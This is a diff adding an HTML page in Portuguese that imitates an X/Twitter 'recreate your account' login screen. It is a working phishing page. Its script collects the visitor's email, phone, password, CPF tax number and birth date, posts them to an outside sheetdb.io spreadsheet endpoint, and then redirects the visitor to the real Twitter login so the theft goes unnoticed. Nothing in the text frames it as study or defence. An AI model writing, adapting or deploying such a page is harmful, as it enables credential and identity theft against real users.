@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Página de Login</title>
+    <style>
+        body {
+            font-family: Helvetica, sans-serif;
+            background-color: #000000;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
+        .imagem {
+            margin-bottom: 0px;
+        }
+        .imagem img {
+            max-width: 10%;
+            height: auto;
+            border-radius: 0%;
+        }
+        .container {
+            background-color: #000000;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            max-width: 400px;
+            width: 100%;
+        }
+        h2 {
+            margin-top: 10px;
+            display: flex;
+            color: #ffffff;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group label {
+            display: flex;
+            margin-bottom: 5px;
+            color: #ffffff;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 15px;
+            border: 1px solid #1972a6;
+            border-radius: 10px;
+            box-sizing: border-box;
+            background-color: #000000;
+            color: #ffffff;
+        }
+        .form-group input[type="submit"] {
+            background-color: #ffffff;
+            color: rgb(0, 0, 0);
+            border: none;
+            padding: 10px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 20px;
+        }
+        .form-group input[type="submit"]:hover {
+            background-color: #1972a6;
+        }
+    </style>
+</head>
+<body>
+    <div class="imagem">
+        <img src="x2.png" alt="Logo do Xlog">
+    </div>
+ 
+    <div class="container">
+        <h2><b>Crie novamente sua conta</b></h2>
+        <form id="accountForm">
+            <div class="form-group">
+                <label for="email">Email</label>
+                <input type="email" id="email" name="email" required>
+            </div>
+            <div class="form-group">
+                <label for="telefone">Telefone</label>
+                <input type="tel" id="telefone" name="telefone" required>
+            </div>
+            <div class="form-group">
+                <label for="senha">Senha</label>
+                <input type="password" id="senha" name="senha" required>
+            </div>
+            <div class="form-group">
+                <label for="cpf">CPF</label>
+                <input type="text" id="cpf" name="cpf" required>
+            </div>
+            <div class="form-group">
+                <label for="data-nascimento">Data de Nascimento</label>
+                <input type="date" id="data-nascimento" name="data-nascimento" required>
+            </div>
+            <div class="form-group">
+                <input type="submit" value="Entrar">
+            </div>
+        </form>
+    </div>
+ 
+    <script>
+        document.getElementById('accountForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Impede o envio padrão do formulário
+           
+            const formData = new FormData(this);
+ 
+            fetch('https://sheetdb.io/api/v1/hriklrzvu2dm8', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (response.ok) {
+                    return response.json();
+                }
+                throw new Error('Erro ao salvar os dados');
+            })
+            .then(data => {
+                console.log('Dados salvos com sucesso:', data);
+                // Redireciona para o Facebook após a confirmação
+                window.location.href = 'https://twitter.com/i/flow/login';
+            })
+            .catch(error => {
+                console.error('Erro:', error);
+                alert('Ocorreu um erro ao salvar os dados. Tente novamente.');
+            });
+        });
+    </script>
+</body>
+</html>
+ 
